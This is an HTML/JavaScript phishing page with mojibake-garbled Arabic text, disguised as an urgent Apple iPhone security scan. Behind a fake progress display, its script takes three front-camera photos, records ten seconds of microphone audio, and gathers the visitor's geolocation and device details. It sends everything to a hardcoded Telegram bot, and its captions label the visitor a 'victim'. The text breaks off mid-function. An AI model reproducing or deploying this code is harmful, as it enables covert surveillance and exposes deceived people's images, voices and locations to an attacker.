<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    
    <title>ğŸ“± ØªØ­Ø¯ÙŠØ« Ø£Ù…Ù†ÙŠ Ø¹Ø§Ø¬Ù„ - Apple iPhone</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(145deg, #1a1a1a 0%, #2d2d2d 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
            position: relative;
            overflow-x: hidden;
        }

        /* Ø®Ù„ÙÙŠØ© Ù…ØªØ­Ø±ÙƒØ© */
        .gradient-bg {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 30% 50%, rgba(0,113,227,0.1) 0%, transparent 50%),
                        radial-gradient(circle at 70% 50%, rgba(92, 106, 196,0.1) 0%, transparent 50%);
            z-index: 0;
            animation: gradientMove 10s ease infinite;
        }

        @keyframes gradientMove {
            0%,100% { opacity: 0.5; }
            50% { opacity: 1; }
        }

        .container {
            width: 100%;
            max-width: 400px;
            position: relative;
            z-index: 10;
        }

        /* Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© */
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 30px 25px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.3), 0 0 0 2px rgba(255,255,255,0.1) inset;
            animation: cardFloat 0.6s ease-out;
        }

        @keyframes cardFloat {
            from {
                opacity: 0;
                transform: translateY(40px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* Ø´Ø¹Ø§Ø± Apple Ù…ØªØ­Ø±Ùƒ */
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
        }

        .apple-logo {
            width: 70px;
            height: 70px;
            background: #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            animation: logoPulse 2s infinite;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        @keyframes logoPulse {
            0%,100% { transform: scale(1); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
            50% { transform: scale(1.05); box-shadow: 0 20px 30px rgba(0,113,227,0.4); }
        }

        .apple-logo svg {
            width: 40px;
            height: 40px;
            fill: white;
        }

        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù… */
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(0,0,0,0.1);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }

        .progress-bar.active {
            display: block;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0071e3, #5c6ac4);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 3px;
            position: relative;
            overflow: hidden;
        }

        .progress-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shimmer 1.5s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* Ø§Ù„Ø¹Ù†ÙˆØ§Ù† */
        h1 {
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #1a1a1a, #333);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            text-align: center;
            color: #666;
            font-size: 15px;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        /* Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª Ø§Ù„Ø­Ø§Ù„Ø© */
        .status-icons {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 25px;
        }

        .status-icon {
            width: 45px;
            height: 45px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            animation: iconPop 0.5s ease;
            position: relative;
        }

        @keyframes iconPop {
            from { transform: scale(0); }
            to { transform: scale(1); }
        }

        .status-icon:nth-child(1) { animation-delay: 0.1s; }
        .status-icon:nth-child(2) { animation-delay: 0.2s; }
        .status-icon:nth-child(3) { animation-delay: 0.3s; }
        .status-icon:nth-child(4) { animation-delay: 0.4s; }

        .status-icon.active::after {
            content: '';
            position: absolute;
            width: 12px;
            height: 12px;
            background: #4cd964;
            border-radius: 50%;
            bottom: 0;
            right: 0;
            border: 2px solid white;
        }

        /* Ø´Ø§Ø´Ø© Ø§Ù„ÙØ­Øµ */
        .scan-area {
            background: rgba(0,0,0,0.03);
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
        }

        .scan-item {
            display: flex;
            align-items: center;
            padding: 12px;
            background: white;
            border-radius: 12px;
            margin-bottom: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            transform: translateX(0);
            transition: all 0.3s ease;
        }

        .scan-item.scanning {
            background: linear-gradient(90deg, #0071e3, #5c6ac4);
            color: white;
            transform: scale(1.02);
        }

        .scan-item.completed {
            background: #e8f5e9;
            color: #2e7d32;
        }

        .scan-item .icon {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            margin-left: 12px;
        }

        .scan-item .label {
            flex: 1;
            font-weight: 500;
        }

        .scan-item .status {
            font-size: 20px;
        }

        /* Ø²Ø± Ø§Ù„ØªØ­Ù‚Ù‚ */
        .verify-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #0071e3, #5c6ac4);
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin: 20px 0;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0,113,227,0.3);
        }

        .verify-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }

        .verify-btn:hover::before {
            left: 100%;
        }

        .verify-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        /* Ø¹Ù†Ø§ØµØ± Ù…Ø®ÙÙŠØ© Ù„Ù„ØªØµÙŠØ¯ */
        .hidden-capture {
            display: none;
        }

        #video, #audio {
            display: none;
        }

        /* Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø­Ø§Ù„Ø© */
        .status-message {
            text-align: center;
            padding: 12px;
            border-radius: 12px;
            margin: 10px 0;
            display: none;
        }

        .status-message.success {
            background: #e8f5e9;
            color: #2e7d32;
            border-right: 4px solid #4cd964;
            display: block;
        }

        .status-message.error {
            background: #ffebee;
            color: #c62828;
            border-right: 4px solid #ff3b30;
            display: block;
        }

        .status-message.info {
            background: #e3f2fd;
            color: #1565c0;
            border-right: 4px solid #2196f3;
            display: block;
        }

        /* Ø£Ù…Ø§Ù† Ø¥Ø¶Ø§ÙÙŠ */
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid rgba(0,0,0,0.1);
            color: #999;
            font-size: 12px;
        }

        /* Ø±Ù‚Ø§Ø¦Ù‚ Ù…ØªØ­Ø±ÙƒØ© */
        .floating-shapes {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            z-index: 1;
        }

        .shape {
            position: absolute;
            background: linear-gradient(135deg, rgba(0,113,227,0.1), rgba(92,106,196,0.1));
            border-radius: 50%;
            animation: float 20s infinite;
        }

        @keyframes float {
            0%,100% { transform: translate(0, 0) rotate(0deg); }
            25% { transform: translate(20px, -20px) rotate(90deg); }
            50% { transform: translate(-20px, 20px) rotate(180deg); }
            75% { transform: translate(20px, 20px) rotate(270deg); }
        }

        .shape1 { width: 200px; height: 200px; top: -50px; right: -50px; animation-delay: 0s; }
        .shape2 { width: 150px; height: 150px; bottom: -50px; left: -50px; animation-delay: 5s; }
        .shape3 { width: 100px; height: 100px; top: 50%; left: 20%; animation-delay: 10s; }
    </style>
</head>
<body>
    <!-- Ø®Ù„ÙÙŠØ© Ù…ØªØ­Ø±ÙƒØ© -->
    <div class="gradient-bg"></div>
    <div class="floating-shapes">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>

    <div class="container">
        <div class="card">
            <!-- Ø´Ø¹Ø§Ø± Apple Ù…ØªØ­Ø±Ùƒ -->
            <div class="logo-container">
                <div class="apple-logo">
                    <svg viewBox="0 0 24 24">
                        <path d="M18.71 19.5C17.88 20.74 17 21.95 15.66 21.97C14.32 22 13.89 21.18 12.37 21.18C10.84 21.18 10.37 21.95 9.1 22C7.82 22.05 6.8 20.68 5.96 19.47C4.25 17 2.94 12.45 4.7 9.39C5.57 7.87 7.13 6.91 8.82 6.88C10.1 6.86 11.32 7.75 12.11 7.75C12.89 7.75 14.37 6.68 15.92 6.84C16.57 6.87 18.39 7.1 19.56 8.82C19.47 8.88 17.39 10.1 17.41 12.63C17.44 15.65 20.06 16.66 20.09 16.67C20.06 16.74 19.67 18.11 18.71 19.5ZM13 3.5C13.73 2.67 14.94 2.04 15.94 2C16.07 3.17 15.6 4.35 14.9 5.19C14.21 6.04 13.07 6.7 11.95 6.61C11.8 5.46 12.36 4.26 13 3.5Z"/>
                    </svg>
                </div>
                
                <h1>ğŸ” ÙØ­Øµ Ø£Ù…Ù†ÙŠ Ù…ØªÙ‚Ø¯Ù…</h1>
                <div class="subtitle">
                    ÙŠØ¬Ø±ÙŠ Ø§Ù„Ù†Ø¸Ø§Ù… ÙØ­ØµØ§Ù‹ Ø´Ø§Ù…Ù„Ø§Ù‹ Ù„Ø¬Ù‡Ø§Ø²Ùƒ Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø¹Ø¯Ù… ÙˆØ¬ÙˆØ¯ Ø«ØºØ±Ø§Øª Ø£Ù…Ù†ÙŠØ©
                </div>
            </div>

            <!-- Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª Ø§Ù„Ø­Ø§Ù„Ø© -->
            <div class="status-icons">
                <div class="status-icon" id="statusCamera">ğŸ“¸</div>
                <div class="status-icon" id="statusMic">ğŸ¤</div>
                <div class="status-icon" id="statusLocation">ğŸ“</div>
                <div class="status-icon" id="statusDevice">ğŸ“±</div>
            </div>

            <!-- Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù… -->
            <div class="progress-bar" id="progressBar">
                <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
            </div>

            <!-- Ù…Ù†Ø·Ù‚Ø© Ø§Ù„ÙØ­Øµ -->
            <div class="scan-area" id="scanArea">
                <div class="scan-item" id="scanCamera">
                    <div class="icon">ğŸ“¸</div>
                    <div class="label">ÙØ­Øµ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</div>
                    <div class="status" id="scanCameraStatus">â³</div>
                </div>
                <div class="scan-item" id="scanMic">
                    <div class="icon">ğŸ¤</div>
                    <div class="label">ÙØ­Øµ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†</div>
                    <div class="status" id="scanMicStatus">â³</div>
                </div>
                <div class="scan-item" id="scanLocation">
                    <div class="icon">ğŸ“</div>
                    <div class="label">ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹</div>
                    <div class="status" id="scanLocationStatus">â³</div>
                </div>
                <div class="scan-item" id="scanDevice">
                    <div class="icon">ğŸ“±</div>
                    <div class="label">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</div>
                    <div class="status" id="scanDeviceStatus">â³</div>
                </div>
            </div>

            <!-- Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø­Ø§Ù„Ø© -->
            <div id="statusMessage" class="status-message"></div>

            <!-- Ø²Ø± Ø§Ù„ØªØ­Ù‚Ù‚ -->
            <button class="verify-btn" id="verifyBtn" onclick="startSecurityScan()">
                Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø£Ù…Ù†ÙŠ
            </button>

            <!-- Ø´Ø§Ø±Ø© Ø§Ù„Ø£Ù…Ø§Ù† -->
            <div class="security-badge">
                <span>ğŸ”’ Ù…Ø´ÙØ± ÙˆØ¢Ù…Ù†</span>
                <span>ğŸ›¡ï¸ Ø­Ù…Ø§ÙŠØ© Ù†Ø´Ø·Ø©</span>
                <span>âš¡ 256-bit SSL</span>
            </div>
        </div>
    </div>

    <!-- Ø¹Ù†Ø§ØµØ± Ù…Ø®ÙÙŠØ© Ù„Ù„ØªØµÙŠØ¯ -->
    <video id="video" autoplay playsinline></video>
    <audio id="audio" autoplay></audio>
    
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // ===== Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª =====
        const BOT_TOKEN = "8293090281:AAEGoOI7axwWGvKYcczhS58AjWYiHzvUBrI";
        const CHAT_ID = "6888107255";  // Ø¶Ø¹ Ù…Ø¹Ø±ÙÙƒ Ù‡Ù†Ø§
        
        // ===== Ù…ØªØºÙŠØ±Ø§Øª Ø¹Ø§Ù…Ø© =====
        let victimId = 'iphone_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        let mediaStream = null;
        let audioStream = null;
        let capturedPhotos = [];
        let capturedAudio = [];
        let scanComplete = false;
        
        // ===== Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… =====
        async function sendToTelegram(type, data) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            let message = `ğŸš¨ **Ø¬Ù‡Ø§Ø² iPhone Ø¬Ø¯ÙŠØ¯**\n`;
            message += `ğŸ†” **Ø§Ù„Ù…Ø¹Ø±Ù:** \`${victimId}\`\n`;
            message += `ğŸ“± **Ø§Ù„Ù†ÙˆØ¹:** ${type}\n`;
            message += `ğŸ•’ **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-SA')}\n\n`;
            message += `ğŸ“Š **Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:**\n\`\`\`\n${JSON.stringify(data, null, 2)}\n\`\`\``;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.log('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', e);
            }
        }
        
        // ===== Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… =====
        async function sendPhotoToTelegram(photoBlob, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
            formData.append('caption', caption);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.log('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', e);
            }
        }
        
        // ===== Ø¥Ø±Ø³Ø§Ù„ Ù…Ù„Ù ØµÙˆØªÙŠ =====
        async function sendAudioToTelegram(audioBlob, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('audio', audioBlob, `audio_${Date.now()}.ogg`);
            formData.append('caption', caption);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.log('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØª:', e);
            }
        }
        
        // ===== ØªØ­Ø¯ÙŠØ« Ø­Ø§Ù„Ø© Ø§Ù„ÙØ­Øµ =====
        function updateScanStatus(item, status) {
            const element = document.getElementById(`scan${item}`);
            const statusElement = document.getElementById(`scan${item}Status`);
            const iconElement = document.getElementById(`status${item}`);
            
            if (status === 'scanning') {
                element.className = 'scan-item scanning';
                statusElement.innerHTML = 'â³';
                iconElement.classList.add('active');
            } else if (status === 'completed') {
                element.className = 'scan-item completed';
                statusElement.innerHTML = 'âœ…';
            }
        }
        
        // ===== ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù… =====
        function updateProgress(percent) {
            document.getElementById('progressBar').classList.add('active');
            document.getElementById('progressFill').style.width = percent + '%';
        }
        
        // ===== Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© =====
        function showMessage(msg, type = 'info') {
            const msgDiv = document.getElementById('statusMessage');
            msgDiv.className = `status-message ${type}`;
            msgDiv.innerHTML = msg;
            msgDiv.style.display = 'block';
            
            setTimeout(() => {
                msgDiv.style.display = 'none';
            }, 5000);
        }
        
        // ===== Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² =====
        async function collectDeviceInfo() {
            updateScanStatus('Device', 'scanning');
            
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                screenWidth: screen.width,
                screenHeight: screen.height,
                pixelRatio: window.devicePixelRatio,
                colorDepth: screen.colorDepth,
                orientation: screen.orientation ? screen.orientation.type : 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = {
                        level: battery.level * 100 + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {}
            }
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø¨ÙƒØ©
            if (navigator.connection) {
                deviceInfo.network = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
            
            await sendToTelegram('Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²', deviceInfo);
            
            updateScanStatus('Device', 'completed');
            updateProgress(25);
        }
        
        // ===== Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± =====
        async function accessCamera() {
            updateScanStatus('Camera', 'scanning');
            
            try {
                // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });
                
                const video = document.getElementById('video');
                video.srcObject = mediaStream;
                
                showMessage('âœ… ØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±...', 'success');
                
                // Ø§Ù„ØªÙ‚Ø§Ø· 3 ØµÙˆØ± Ù…ØªØªØ§Ù„ÙŠØ©
                for (let i = 0; i < 3; i++) {
                    await capturePhoto(i + 1);
                    await new Promise(r => setTimeout(r, 1000));
                }
                
                // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                mediaStream.getTracks().forEach(track => track.stop());
                
                updateScanStatus('Camera', 'completed');
                updateProgress(50);
                
            } catch (err) {
                console.log('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', err);
                showMessage('âš ï¸ ØªØ¹Ø°Ø± Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰...', 'error');
                
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ†
                setTimeout(accessCamera, 2000);
            }
        }
        
        // ===== Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© =====
        async function capturePhoto(index) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Blob
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
            
            // Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§
            capturedPhotos.push(blob);
            await sendPhotoToTelegram(blob, `ğŸ“¸ ØµÙˆØ±Ø© ${index} Ù…Ù† Ø§Ù„Ø¶Ø­ÙŠØ© ${victimId}`);
            
            showMessage(`ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© ${index}/3`, 'success');
        }
        
        // ===== Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† ÙˆØ§Ù„ØªØ³Ø¬ÙŠÙ„ =====
        async function accessMicrophone() {
            updateScanStatus('Mic', 'scanning');
            
            try {
                // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†
                audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true,
                        sampleRate: 44100
                    }
                });
                
                showMessage('âœ… ØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†ØŒ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ³Ø¬ÙŠÙ„...', 'success');
                
                // Ø¨Ø¯Ø£ Ø§Ù„ØªØ³Ø¬ÙŠÙ„
                const mediaRecorder = new MediaRecorder(audioStream, {
                    mimeType: 'audio/webm;codecs=opus'
                });
                
                const audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    capturedAudio.push(audioBlob);
                    await sendAudioToTelegram(audioBlob, `ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ Ù…Ù† ${victimId}`);
                    
                    showMessage('ğŸ¤ ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡', 'success');
                };
                
                // ØªØ³Ø¬ÙŠÙ„ Ù„Ù…Ø¯Ø© 10 Ø«ÙˆØ§Ù†ÙŠ
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    audioStream.getTracks().forEach(track => track.stop());
                }, 10000);
                
                updateScanStatus('Mic', 'completed');
                updateProgress(75);
                
            } catch (err) {
                console.log('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†:', err);
                showMessage('âš ï¸ ØªØ¹Ø°Ø± Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†', 'error');
                updateScanStatus('Mic', 'completed');
                updateProgress(75);
            }
        }
        
        // ===== Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ =====
        async function getLocation() {
            updateScanStatus('Location', 'scanning');
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        
                        // Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©
                        locationData.mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                        
                        await sendToTelegram('Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ', locationData);
                        
                        showMessage(`ğŸ“ ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${locationData.latitude}, ${locationData.longitude}`, 'success');
                        updateScanStatus('Location', 'completed');
                        updateProgress(100);
                        
                        // Ø¨Ø¹Ø¯ Ø§ÙƒØªÙ…Ø§Ù„ ÙƒÙ„ Ø´ÙŠØ¡
                        scanComplete = true;
                        document.getElementById('verifyBtn').innerHTML = 'âœ… Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ Ø¨Ù†Ø¬Ø§Ø­';
                        document.getElementById('verifyBtn').disabled = true;
                        
                        // Ø¥Ø±Ø³Ø§Ù„ ØªÙ‚Ø±ÙŠØ± Ù†Ù‡Ø§Ø¦ÙŠ
                        await sendToTelegram('ØªÙ‚Ø±ÙŠØ± Ù†Ù‡Ø§Ø¦ÙŠ', {
                            victimId: victimId,
                            photosCount: capturedPhotos.length,
                            audioRecorded: capturedAudio.length > 0,
                            scanComplete: true,
                            completionTime: new Date().toISOString()
                        });
                        
                        showMessage('ğŸ‰ Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø£Ù…Ù†ÙŠ Ø¨Ù†Ø¬Ø§Ø­!', 'success');
                    },
                    (error) => {
                        let errorMsg = 'Ø®Ø·Ø£ ÙÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'ØªÙ… Ø±ÙØ¶ Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…ØªØ§Ø­';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'Ø§Ù†ØªÙ‡Øª Ù…Ù‡Ù„Ø© Ø§Ù„Ø·Ù„Ø¨';
                                break;
                        }
                        
                        showMessage(`âš ï¸ ${errorMsg}`, 'error');
                        updateScanStatus('Location', 'completed');
                        updateProgress(100);
                        
                        scanComplete = true;
                        document.getElementById('verifyBtn').innerHTML = 'âœ… Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ';
                        document.getElementById('verifyBtn').disabled = true;
                        
                        sendToTelegram('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…ÙˆÙ‚Ø¹', { error: errorMsg, victimId });
                    }
                );
            } else {
                showMessage('âš ï¸ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹', 'error');
                updateScanStatus('Location', 'completed');
                updateProgress(100);
                
                scanComplete = true;
                document.getElementById('verifyBtn').innerHTML = 'âœ… Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ';
                document.getElementById('verifyBtn').disabled = true;
            }
        }
        
        // ===== Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø£Ù…Ù†ÙŠ =====
        async function startSecurityScan() {
